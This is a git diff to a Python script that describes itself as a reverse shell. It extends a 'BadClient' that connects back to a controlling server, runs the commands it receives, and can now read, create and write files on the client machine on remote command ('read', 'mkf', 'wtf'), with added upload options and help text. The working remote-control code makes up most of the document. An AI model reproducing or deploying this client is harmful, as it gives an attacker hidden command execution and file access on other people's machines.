@@ -1,7 +1,10 @@
+# TODO Written by Bersenrar you can use this script :3 If you will show some where in media space please use
+#  my GIT profile in sources list
 import argparse
 import socket
 import subprocess
 import shlex
+import time
 from sys import exit as exit_the_script
 import os
 import threading
@@ -64,6 +67,20 @@ class ServerReverse:
 
         exit_the_script()
 
+    def write_to_file(self, user_socket):
+        stop_writing_msg = "exit0"
+        time.sleep(2)
+        while True:
+            line_to_write = input(">>> ")
+            line_to_write = line_to_write + "\n"
+            if stop_writing_msg in line_to_write:
+                user_socket.send(stop_writing_msg.encode())
+                break
+            if len(line_to_write) < 300:
+                line_to_write = line_to_write + " " * (300 - len(line_to_write))
+            user_socket.send(line_to_write.encode())
+        return
+
     def cmd_prompt(self, user_socket):
         # DECODING_CONST = user_socket.recv(300).decode().strip()
         while True:
@@ -75,6 +92,9 @@ class ServerReverse:
             cmd = cmd + "\n"
             user_socket.send(cmd.encode("utf-8"))
             client_response = b""
+
+            if "wtf" in cmd:
+                self.write_to_file(user_socket)
 
             while True:
                 part_of_msg = user_socket.recv(300)
@@ -135,6 +155,43 @@ class BadClient:
             self.client_reverse.send(msg_to_send)
         exit_the_script()
 
+    def write_in_file(self, name_for_file):
+        with open(name_for_file, "rb") as file_to_check:
+            data = file_to_check.read().strip()
+            file_to_check.close()
+
+        if not data:
+            flag = "wt"
+        else:
+            flag = "at"
+
+        with open(name_for_file, flag) as file_to_write:
+            while True:
+                string_to_write = self.client_reverse.recv(300).decode().rstrip()
+                if string_to_write == "exit0":
+                    break
+                file_to_write.write(string_to_write + "\n")
+            file_to_write.close()
+
+        return b"0"
+
+    def read_file(self, buffer):
+        try:
+            path = shlex.split(buffer)[1]
+            with open(path, "rb") as file:
+                result = file.read()
+        except Exception as err:
+            result = b"1"
+            print(f"Something went wrong {err}")
+        return result
+
+    def create_file(self, buffer):
+        name_for_file = buffer[:]
+        with open(name_for_file, "wb") as ___:
+            ___.close()
+        result = b"0"
+        return result
+
     def cmd_prompt_client(self):
 
         while True:
@@ -154,24 +211,29 @@ class BadClient:
             print(buffer)
 
             if "cd" in buffer:
+                result_flag = False
                 try:
                     # Sometimes can return 1 code means error but don't pay attention to this
                     # Because directory change anyway if there enough rights to do this action
                     path = shlex.split(buffer)[1]
                     os.chdir(path)
-                    result = b"0"
+                    result_flag = False
                 except Exception as error:
-                    result = b"1"
+                    result_flag = True
                     print(f"Something went wrong {error}")
+                result = f"{int(result_flag)}".encode()
 
-            if "read" in buffer:
-                try:
-                    path = shlex.split(buffer)[1]
-                    with open(path, "rb") as file:
-                        result = file.read()
-                except Exception as err:
-                    result = b"1"
-                    print(f"Something went wrong {err}")
+            elif "mkf" in buffer:
+                name_for_f = shlex.split(buffer)[1]
+                result = self.create_file(name_for_f)
+
+            elif "read" in buffer:
+                result = self.read_file(buffer)
+
+            elif "wtf" in buffer:
+                name = shlex.split(buffer)
+                result = self.write_in_file(name[1])
+
             else:
                 result = execute(buffer)
 
@@ -208,16 +270,35 @@ if __name__ == "__main__":
     # If necessary to kill the process
     print(f'[PID] {os.getpid()}\nUse taskkill /f -pid PID on windows\nkill PID on Linux if something went wrong')
     parser = argparse.ArgumentParser(description='''There is a reverse shell script which allows you to send for example files \
-    or open a command prompt on from client side
+    or open a command prompt on client side if you want read file threw shell use read [file_name], if you want create \
+     file use mkf command with name of file mkf some_file.txt if you want start writing in file use wtf command
     ''')
 
-    parser.add_argument("-t", "--target", action="store", default="localhost", type=str)
-    parser.add_argument("-p", "--port", action="store", default=5555, type=int)
-    parser.add_argument("-s", "--server", action="store_true")
+    parser.add_argument("-t", "--target", action="store", default="localhost", type=str, help="Use this option to"
+                                                                                              " specify"
+                                                                                              " ip address(IPV4)")
+    parser.add_argument("-p", "--port", action="store", default=5555, type=int, help="Use this option to specify"
+                                                                                     " the port "
+                                                                                     "on which server/client would run")
+    parser.add_argument("-s", "--server", action="store_true", help="Use this option if you want to"
+                                                                    " run script as server")
 
+    # Params if you want upload/download file/directory(directory with every file in there)
     parser.add_argument("-up", "--upload", action="store_true", default=False)
-    parser.add_argument("-abp", "--absolute_path", action="store")
-    parser.add_argument("-nf", "--name_for_file", action="store")
+    parser.add_argument("-abp", "--absolute_path", action="store", help="Use this option to specify path to file or"
+                                                                        " directory if using updr function")
+    parser.add_argument("-nf", "--name_for_file", action="store", help="Use this option to specify the name for file"
+                                                                       " which would download")
+    parser.add_argument("-updr", "--upload_directory", action="store_true", default=False,
+                                                                            help="Use this option if you want to"
+                                                                            " upload a directory for client side"
+                                                                            "(which would send a files you also need"
+                                                                            " a path"
+                                                                            "for server which would receive"
+                                                                            " files you also need use this option"
+                                                                            " also you need to"
+                                                                            " use -nf option to specify the new"
+                                                                            " directory name)")
 
     args = parser.parse_args()
 
@@ -285,6 +366,20 @@ if __name__ == "__main__":
 # Wind time, wolf time
 # This is our end
 
+
+# Donnez-moi une suite au Ritz,
+# Je n'en veux pas
+# Des bijoux de chez Chanel,
+# Je n'en veux pas
+# Donnez moi une limousine,
+# J'en ferais quoi
+# Papalapapapa
+# Offrez moi du personnel,
+# J'en ferais quoi
+# Un manoir à Neuchâtel,
+# Ce n'est pas pour moi
+# Offrez moi la tour Eiffel,
+# J'en ferais quoi
 
 
 
